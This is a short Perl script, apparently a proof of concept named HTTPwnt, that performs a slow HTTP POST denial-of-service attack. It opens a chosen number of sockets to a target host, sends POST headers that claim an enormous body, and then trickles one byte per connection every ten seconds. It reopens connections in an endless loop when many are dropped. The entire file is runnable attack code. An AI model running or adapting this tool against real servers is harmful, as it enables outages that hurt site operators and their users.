#!/usr/bin/perl
#
# HTTPwnt v0.1 - HTTP Layer 7 DoS PoC
# Author: pasv (pasv [at] csu.fullerton.edu
#
# Usage: ./HTTPwnt.pl mooface.com 1000
#

use IO::Socket;

sub usage {
        print "$0 host maxconn";
};

if(@ARGV != 2) {
        usage();
        exit(-1);
}

$target=shift;
$maxconn=shift;

while(1) {
        print "Beginning attack on $target with $maxconn connections\n";
        for($i=0;$i<$maxconn;$i++) {
                $s[$i]=IO::Socket::INET->new(
                        PeerAddr => $target,
                        PeerPort => 81,
                        Proto => tcp,
                        ) or die "Couldnt open socket #$i: $!";
                print "#$i:opened\n";
        }
        print "\n\n";

        for($i=0;$i<$maxconn;$i++) {
                # HTTP header, modify as needed
                $s[$i]->send("POST /XXXXXXXXXXXX HTTP/1.1\r\nHost: $target\r\nConnection: keep-alive\r\n".
                        "Keep-Alive: 800\r\nContent-Length: 99999999\r\nContent-Type:" .
                        " application/x-www-form-urlencoded\r\nAccept: *.*\r\nUser-Agent:EnjoyTheLogs\r\n");
        }
        # main attack loop
        attack:
        while(1) {
                sender:
                for($i=0;$i<$maxconn;$i++) {
                        foreach (@closed) {
                                if($_ == $i) {
                                        next sender;
                                }
                        }
                        $s[$i]->send("F") or do {
                                print "socket #$i was closed :'(\n"; 
                                push @closed,$i;
                        };
                        # more than half our sockets are closed! regroup! go again!
                        if(scalar(@closed) > ($i/2)) {
                                undef(@closed);
                                $_->close() foreach @s;
                                last attack;
                        }
                }
                sleep 10; #maybe change this later?
        }
        print "closed all our sockets, re-initiating attack\n";
}
